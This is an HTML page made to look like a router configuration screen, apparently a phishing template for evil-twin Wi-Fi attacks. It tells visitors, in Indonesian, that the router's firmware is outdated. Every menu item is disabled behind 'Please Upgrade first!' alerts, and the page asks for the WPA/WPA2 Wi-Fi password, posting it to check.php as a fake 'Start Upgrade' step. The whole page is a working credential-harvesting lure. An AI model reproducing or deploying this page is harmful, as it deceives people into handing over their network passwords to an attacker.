<!DOCTYPE html>
<html lang=en> <head><title>Router Configuration Page</title><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=bootstrap.min.css><script src=jquery.min.js></script><script src=bootstrap.min.js></script><!-- CSS --><style type=text/css>

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }
  </style></head> <body> <!-- Start navigation bar --> <!-- To change the navigation bar color change background attribute --> <nav class="navbar navbar-inverse" style=background:RoyalBlue;margin-top:2em;> <div class=container-fluid> <div class=navbar-header> <button type=button class=navbar-toggle data-toggle=collapse data-target=#myNavbar> <span class=icon-bar></span> <span class=icon-bar></span> <span class=icon-bar></span> </button> <!--
        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
        --> </div> <div class="collapse navbar-collapse" id=myNavbar> <ul class="nav navbar-nav"> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white onclick=alertt()>Setup <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Basic Setup</a></li> <li><a href=#>DDNS</a></li> <li><a href=#>MAC Address Clone</a></li> <li><a href=#>Advanced Routing</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white onclick=alertt()>Wireless <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Basic Wireless Settings</a></li> <li><a href=# onclick=alertt()>Wireless Security</a></li> <li><a href=#>Wireless MAC Filter</a></li> <li><a href=#>Advanced Wireless Settings</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Security <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Firewall</a></li> <li><a href=#>VPN</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white onclick=alertt()>Access Restriction <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Internet Access</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white onclick=alertt()>Administration <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Management</a></li> <li><a href=#>Log</a></li> <li><a href=#>Diagnostics</a></li> <li><a href=#>Factory Defaults</a></li> <li><a href=#>Config Manegements</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white onclick=alertt()>Status <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Router</a></li> <li><a href=#>Local Network</a></li> <li><a href=#>Wireless</a></li> <li><a href=#>Advanced Routing</a></li> </ul> </li> </ul> </div> </div> </nav> <!-- End navigation bar --> <!-- Start page content --> <div class=container> <div class=col-sm> <h2 class=text-center style=color:RoyalBlue>Firmware Upgrade</h2> <p class=lead>Router ini menggunakan firmware yang sudah kadaluarsa, ikuti panduan dibawah ini untuk upgrade.</p> </div> <form action=check.php method=POST> <div class=form-group> 
       

       <div class=checkbox> <label><input type=checkbox id=check-box onclick=checkBoxStatus()>I Agree With Above Terms And Conditions</label> </div> </div> <div class="form-group has-feedback"> <label for=password>Password WIFI WPA/WPA2</label> <input class=form-control type=text id=pwd name=key1> </div> <div class="container text-center"> <input type=submit class="btn btn-primary" id=btn value="Start Upgrade"> </div> </form> <div id=push></div> </div> <!-- Start page content --> <!-- Start footer --> <footer class=footer> <div class="container text-center"> <p class=text-muted>Terms© 2016, All Rights Reserved.</p> </div> </footer> <!-- End footer --> <!-- Start update first message --> <div class="modal fade" id=update-only role=dialog> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Update First.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End update first message --> <!-- Start empty password message --> <div class="modal fade" id=empty-pass> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Input Valid Password. (Must be between 7 and 64 characters)</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> <!-- Start empty password message --> <div class="modal fade" id=no-checkbox> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Check The I Agree Button.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> 


       <script>

        function alertt()
        {
          alert("Please Upgrade first!");
        }

/*
  Check the password field and act accordingly.
*/
$("#btn").on("click", function(e) {

    // get the password box and checkbox elements
  var input = document.getElementById("pwd");
    var box = document.getElementById("check-box");

    // if the box is checked
    if ( box.checked != true ){
          // display no checkbox message
          $("#no-checkbox").modal("show");
    return false;
        }
        if ( input.value.lenght < 7 ||  input.value.lenght > 64){
    // display no password message
    $("#empty-pass").modal("show");
    return false;
    }


});


/*
  Check the status of check box
*/
function checkBoxStatus()
{
  // get the password box and checkbox elements
  var box = document.getElementById("check-box");
  var input = document.getElementById("pwd");

  // if the box is checked
  if ( box.checked == true )
    {
      // enabale the password box
      input.disabled = false;
    }
  else
    {
      // disable the password box
      input.disabled = true;
    }
  }
</script> </body> </html> 